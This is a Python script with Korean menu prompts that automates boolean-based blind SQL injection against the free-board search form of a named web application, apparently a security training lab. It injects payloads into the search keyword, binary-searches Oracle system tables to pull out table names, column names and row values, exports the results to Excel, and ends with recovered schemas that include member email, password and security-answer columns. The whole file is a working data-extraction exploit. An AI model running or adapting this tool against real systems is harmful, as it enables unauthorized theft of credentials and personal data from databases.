import requests
from openpyxl import Workbook

 
baseURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
cookies ={"JSESSIONID":input("세션 쿠키 값을 입력하세요")}
data = {
  "searchType":"all",
  "keyword":"unique"
}

def attackForm(query,min=1,max=100):
  while min<=max:
    mid = (min+max)//2
    data["keyword"] = f"unique' and ({query}) > {mid} and '1%'='1"
    if max==mid:
      return max
    else:
      req = requests.post(baseURL,cookies=cookies, data=data)
      if "권한이 없습니다" in req.text:
        print("Session ID를 다시 확인해주세요.") 
      else:
        if "다시 시도" in req.text:
          max= mid       
        else:
          min = mid+1
  

def getCount(dict):
  dict['cnt'] = attackForm(f"select count({dict['target']}) from {dict['collection']}")
  return dict['cnt']

def getLength(dict):
  for i in range(1,dict['cnt']+1):
    lnth=attackForm(f"select length({dict['target']}) from (select {dict['target']}, rownum as rnum from {dict['collection']}) where rnum={i}",1,20)
    dict['dataLen'].append(lnth)
  return dict['dataLen']

def getName(dict):
  for i in range(1, dict['cnt']+1):
    ltrLen = dict['dataLen'][i-1]  
    toStr= ""
    for j in range (1,ltrLen+1):
      asc = attackForm(f"select ascii(substr({dict['target']},{j},1)) from (select {dict['target']}, rownum as rnum from {dict['collection']}) where rnum={i}",32,122)
      toStr+=chr(asc)
    dict['dataStr'].append(toStr)
  print(dict['dataStr'])
  return dict['dataStr']


def getTable():
  tbl = {"target": "table_name",
      "collection":"user_tables",
      "cnt":1,
      "dataLen":[],
      "dataStr":[]}
  
  tblCounts = getCount(tbl)
  tblLengths= getLength(tbl)
  tblNames = getName(tbl)

  return tblNames
  
def getAttr(tbl):
  attr ={"target":"column_name",
    "collection":f"user_tab_columns where table_name='{tbl}'",
    "cnt":1,
    "dataLen":[],
    "dataStr":[]}
  attrCounts = getCount(attr)
  attrLengths= getLength(attr)
  attrNames = getName(attr)
  
  return attrNames


def getFld(tbl, attr):
  fld ={"target":f"{attr}",
    "collection":f"{tbl}",
    "cnt":1,
    "dataLen":[],
    "dataStr":[]}
  fldCounts = getCount(fld)
  fldLengths= getLength(fld)
  fldNames = getName(fld)
  
  return fldNames

  
def saveAsXl(tbl): 
  setFile = Workbook()
  
  setFile.create_sheet(tbl)
  sht = setFile[tbl]
  
  attrs = getAttr(tbl)
  for col_num, attr in enumerate(attrs, start=1):
    sht.cell(row=1, column=col_num, value=attr)
  
  for col_num, attr in enumerate(attrs, start=1):
    flds = getFld(tbl, attr)
    for row_num, fld in enumerate(flds, start=2):
      sht.cell(row=row_num, column=col_num, value=fld)      
      
  setFile.save(r"extData.xlsx") 


def main():  
  while True:
    select = input(""" *=========선택한 번호의 데이터를 추출합니다.=========* 
    1. 전체 테이블 목록 출력
    2. 특정 테이블의 컬럼명 출력
    3. 특정 테이블&컬럼의 필드값 출력
    4. 특정 테이블의 데이터 내역을 파일(.xlsx)로 저장
    0. 데이터 추출을 종료합니다.
*=====================================================* """)
    if select=="0":
      break
    elif select=="1":
      getTable()
    elif select=="2":
      tableInput = input("테이블명을 입력하세요.").upper()
      getAttr(tableInput)
    elif select=="3":
      tableInput = input("테이블명을 입력하세요.").upper()
      attrInput = input("컬럼명을 입력하세요.")
      getFld(tableInput,attrInput)
    elif select=="4":
      tableInput = input("테이블명을 입력하세요.").upper()
      saveAsXl(tableInput)
    else:
      print("출력할 데이터를 다시 선택해주세요.")
    

main()

board = ['BOARD_ID', 'TITLE', 'CONTENT', 'VIEW_COUNT', 'REG_ACCT_ID', 'DEL_FL', 'REG_DT', 'UDT_ACCT_ID', 'UDT_DT', 'BOARD_TYPE_CD']
['FILE_ID', 'FILE_NM', 'FILE_PATH', 'ORG_FILE_NM', 'FILE_SIZE', 'FILE_TYPE_CD', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID']
['MDI_FILE_ID', 'FILE_ID', 'MDI_TYPE_CD', 'MDI_ORDER', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID', 'BOARD_ID']
member = ['ACCT_ID', 'LOGIN_ID', 'USER_NM', 'USER_TERMS_YN', 'PRIVACY_YN', 'EMAIL', 'PASS', 'ZIPCODE', 'ADDRESS1', 'ADDRESS2', 'REG_ACCT_ID', 'REG_DT', 'UDT_ACCT_ID', 'UDT_DT', 'MAIL_CERTI_KEY', 'CERTI_YN', 'ADMIN_YN', 'PWDQ', 'PWDANS', 'PWDCNT', 'FSTPWD']
zipcode = ['ZIPCODE', 'SIDO', 'GUGUN', 'DONG', 'BUNJI']

answer = ['ANSWER', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID']
